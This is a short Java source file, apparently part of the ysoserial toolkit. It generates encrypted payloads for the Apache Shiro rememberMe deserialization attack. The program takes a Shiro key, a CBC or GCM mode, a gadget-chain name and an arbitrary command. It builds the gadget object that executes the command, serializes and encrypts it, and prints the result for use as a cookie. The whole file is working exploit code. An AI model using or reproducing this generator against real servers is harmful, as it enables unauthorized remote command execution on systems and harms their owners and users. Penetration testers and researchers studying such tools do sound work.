package ysoserial.exploit;

import ysoserial.Serializer;
import ysoserial.payloads.CommonsCollections1;
import ysoserial.payloads.ObjectPayload;
import ysoserial.exploit.utils.ShiroEncrypt;

public class ShiroGadgetEncrypt {
    public static void main(String[] args) throws Exception {
        // 处理传入参数，key 加密模式 (CBC,GCM) gadget链 命令
        final String key = args[0].trim();
        final String encryptMode = args[1].trim();
        final String gadget = CommonsCollections1.class.getPackage().getName() +  "." +  args[2].trim();
        final String command = args[3].trim();

        final Class<? extends ObjectPayload> payloadClass = (Class<? extends ObjectPayload>) Class.forName(gadget);
        ObjectPayload payloadObj = payloadClass.newInstance();
        Object payload = payloadObj.getObject(command);
        byte[] ser = Serializer.serialize(payload);

        String encryptString;
        if (encryptMode.equals("CBC")){
            encryptString = ShiroEncrypt.shiroEncryptCBC(ser,key);
            System.out.println(encryptString);
        }else if(encryptMode.equals("GCM")){
            encryptString = ShiroEncrypt.shiroEncryptGCM(ser, key);
            System.out.println(encryptString);
        }else {
            System.out.println("Unknown encrypt mode: " + encryptMode);
        }
    }
}
